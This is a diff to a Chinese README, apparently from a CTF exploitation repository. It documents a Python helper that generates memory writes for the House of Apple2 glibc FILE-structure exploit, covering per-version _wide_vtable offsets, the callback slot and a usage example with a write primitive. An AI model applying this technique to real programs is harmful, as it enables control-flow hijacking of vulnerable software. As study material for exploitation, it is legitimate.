@@ -40,6 +40,54 @@
 
 三份 C 文件已经直接写出各自 ABI 的 fake FILE、wide data 和 fake wide vtable 字段，不再另存重复的布局生成器。2.42～2.43 继续使用 `+0xe0`，但投递原语必须另选。
 
+## Python 离线板子
+
+[`apple2.py`](./apple2.py) 按目标 glibc 版本生成 Apple2 **最终消费点**所需的写入计划。它严格对应三份 C PoC：
+
+```python
+from apple2 import build_house_of_apple2
+
+writes = build_house_of_apple2(
+    "2.35",                         # 2.31～2.43 使用 wide_data + 0xe0
+    file_addr=fake_file,
+    fake_wide_data_addr=fake_wide_data,
+    fake_wide_vtable_addr=fake_wide_vtable,
+    callback_addr=callback,
+    wfile_jumps_addr=libc_base + io_wfile_jumps_offset,
+    narrow_buffer_addr=controlled_buffer,
+    current_flags=known_file_flags,  # 不知道时省略，保留原 flags
+)
+
+for write in writes:
+    write_primitive(write.address, write.data)
+```
+
+### `build_house_of_apple2` 参数
+
+| 参数 | 含义 |
+|---|---|
+| `version` | 目标 glibc 版本字符串。支持 `2.24`～`2.43`；根据此选择 `_wide_vtable` 的 `0x130`、`0xf0` 或 `0xe0` 偏移。 |
+| `file_addr` | fake FILE 或被覆盖的现有 FILE 地址；函数会在这个地址生成 `FILE` 字段写入。 |
+| `fake_wide_data_addr` | fake `_IO_wide_data` 地址；`FILE + 0xa0` 会指向这里。该地址必须可写并满足题目布局要求。 |
+| `fake_wide_vtable_addr` | fake wide vtable 地址；fake wide data 的版本对应槽位会指向这里。 |
+| `callback_addr` | fake wide vtable 的 `__doallocate` 回调地址，固定写在 vtable `+0x68`；实际回调用途由题目决定。 |
+| `wfile_jumps_addr` | 目标 libc 中合法 `_IO_wfile_jumps` 地址，写入 `FILE + 0xd8` 以通过 primary vtable 检查。 |
+| `narrow_buffer_addr` | fake FILE 使用的窄字符缓冲区地址；对应 PoC 中的 `narrow_buffer`，函数按固定 `0x20` 字节生成结束地址。 |
+| `current_flags` | 当前 `_flags` 值；已知时传入，函数清除 `NO_WRITES`、`UNBUFFERED`、`CURRENTLY_PUTTING`，未知时省略以保留原字段。 |
+
+返回值是 `MemoryWrite` 元组。每项包含 `address`、`data` 和 `label`，可直接交给题目的任意写、堆对象编辑或分段写入函数。函数不负责 fake FILE 的投递、libc 地址解析、`__woverflow` 触发或 callback 后续控制流。
+
+版本对应关系：
+
+```text
+2.24～2.29: fake_wide_data + 0x130 -> fake_wide_vtable
+2.30:       fake_wide_data + 0x0f0 -> fake_wide_vtable
+2.31～2.43: fake_wide_data + 0x0e0 -> fake_wide_vtable
+所有版本:   fake_wide_vtable + 0x068 -> callback
+```
+
+返回的 `MemoryWrite` 包含绝对地址、零填充对象镜像和标签。函数只负责消费点布局；`wfile_jumps_addr`、fake FILE 的投递、`__woverflow`/等价 wide overflow 触发和 callback 的实际语义由题目 exploit 提供。它不假设 largebin、stderr 覆盖或任何 hook 终点。
+
 ## 迁移与调试
 
 1. 先确认投递路径和最终触发点在目标 Build ID 中都存在。
